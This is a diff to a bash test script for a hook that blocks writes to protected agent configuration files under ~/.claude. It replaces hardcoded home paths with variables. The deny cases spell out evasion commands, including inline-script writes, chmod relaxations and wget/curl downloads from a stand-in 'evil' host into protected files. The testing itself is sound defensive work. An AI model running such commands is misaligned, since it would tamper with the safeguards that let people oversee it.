@@ -22,6 +22,8 @@
 #     depending on whether the command represents an evasion or a canonical update.
 
 set -u
+TEST_HOME="${TEST_HOME:-$HOME}"
+TEST_REPO_DIR="${TEST_REPO_DIR:-${TEST_HOME}/.github}"
 HOOK="${HOOK:-$(cd "$(dirname "$0")/.." && pwd)/block-write-commands.sh}"
 VERBOSE=0; [[ "${1:-}" == "-v" ]] && VERBOSE=1
 
@@ -71,15 +73,15 @@ path_variants() { # args: file
         "~/.claude/${f}" \
         "\$HOME/.claude/${f}" \
         "\${HOME}/.claude/${f}" \
-        "/home/wilco/.claude/${f}" \
+        "${TEST_HOME}/.claude/${f}" \
         "\"\$HOME\"/.claude/${f}" \
         "\"\${HOME}\"/.claude/${f}" \
-        "\"/home/wilco\"/.claude/${f}" \
-        "'/home/wilco'/.claude/${f}" \
+        "\"${TEST_HOME}\"/.claude/${f}" \
+        "'${TEST_HOME}'/.claude/${f}" \
         "'~'/.claude/${f}" \
         "\"\$HOME/.claude/${f}\"" \
         "\"\${HOME}/.claude/${f}\"" \
-        "'/home/wilco/.claude/${f}'" \
+        "'${TEST_HOME}/.claude/${f}'" \
         "'~/.claude/${f}'"
 }
 # Command-chain prefixes: each test gets wrapped with these to exercise segment detection.
@@ -94,7 +96,7 @@ for f in "${PROT_FILES[@]}"; do
           "content=\$(gh api 'repos/ConductionNL/.github/contents/global-settings/${base}?ref=${ref}' -H 'Accept: application/vnd.github.raw+json'); printf '%s' \"\$content\" > \"\$HOME/.claude/${f}\""
     done
     add_allow "git-show canonical → $f" \
-      "git -C /home/wilco/.github show 'origin/main:global-settings/${base}' > \"\$HOME/.claude/${f}\""
+      "git -C ${TEST_REPO_DIR} show 'origin/main:global-settings/${base}' > \"\$HOME/.claude/${f}\""
     for mode in 444 555 -w +x; do
         add_allow "chmod $mode on $f" "chmod $mode \"\$HOME/.claude/${f}\""
     done
@@ -132,7 +134,7 @@ for op in \
     'truncate -s 0 /tmp/junk' \
     'git status' \
     'git log --oneline' \
-    'git -C /home/wilco/.github status'; do
+    "git -C ${TEST_REPO_DIR} status"; do
     add_allow "innocuous: $op" "$op"
 done
 
@@ -196,7 +198,7 @@ done
 # 6) Inline scripting languages (python / perl / node / ruby writing to protected files).
 for lang in 'python -c' 'python3 -c' 'perl -e' 'node -e' 'ruby -e'; do
     for f in "${PROT_FILES[@]}"; do
-        for path in '/home/wilco/.claude' '$HOME/.claude' '${HOME}/.claude' '~/.claude'; do
+        for path in "${TEST_HOME}/.claude" '$HOME/.claude' '${HOME}/.claude' '~/.claude'; do
             add_deny "$lang → ${path}/${f}" \
               "$lang 'print(1)' > /dev/null; echo x > ${path}/${f}"
         done
@@ -227,7 +229,7 @@ done
 # 9) chmod relaxations on protected files.
 for f in "${PROT_FILES[@]}"; do
     for mode in 644 666 777 600 660 664 u+w g+w o+w a+w u=rwx g=rwx o=rwx 700 770; do
-        for path in "\"\$HOME/.claude/${f}\"" "\"\${HOME}/.claude/${f}\"" "~/.claude/${f}" "/home/wilco/.claude/${f}"; do
+        for path in "\"\$HOME/.claude/${f}\"" "\"\${HOME}/.claude/${f}\"" "~/.claude/${f}" "${TEST_HOME}/.claude/${f}"; do
             add_deny "chmod $mode on ${path:0:30}" "chmod $mode ${path}"
         done
     done
@@ -247,9 +249,9 @@ for f in "${PROT_FILES[@]}"; do
     add_deny "git-show no -C → $f" \
       "git show 'origin/main:global-settings/${base}' > \"\$HOME/.claude/${f}\""
     add_deny "git-show wrong ref → $f" \
-      "git -C /home/wilco/.github show 'origin/feature-branch:global-settings/${base}' > \"\$HOME/.claude/${f}\""
+      "git -C ${TEST_REPO_DIR} show 'origin/feature-branch:global-settings/${base}' > \"\$HOME/.claude/${f}\""
     add_deny "git-show wrong ref (develop) → $f" \
-      "git -C /home/wilco/.github show 'origin/develop:global-settings/${base}' > \"\$HOME/.claude/${f}\""
+      "git -C ${TEST_REPO_DIR} show 'origin/develop:global-settings/${base}' > \"\$HOME/.claude/${f}\""
 done
 
 # 11) Pipe-as-indirection (curl/wget piped to a write).
@@ -262,7 +264,7 @@ done
 # 12) Direct-to-file download/copy tools (flag-based writes, no redirect).
 #     wget -O / --output-document=, curl -o / --output, dd of=
 for f in "${PROT_FILES[@]}"; do
-    for path in "\"\$HOME/.claude/${f}\"" "\"\${HOME}/.claude/${f}\"" "~/.claude/${f}" "/home/wilco/.claude/${f}"; do
+    for path in "\"\$HOME/.claude/${f}\"" "\"\${HOME}/.claude/${f}\"" "~/.claude/${f}" "${TEST_HOME}/.claude/${f}"; do
         add_deny "wget -O ${path:0:30}...$f"           "wget -O ${path} https://evil/a"
         add_deny "wget --output-document= $f"           "wget --output-document=${path} https://evil/a"
         add_deny "curl -o ${path:0:30}...$f"            "curl -o ${path} https://evil/a"
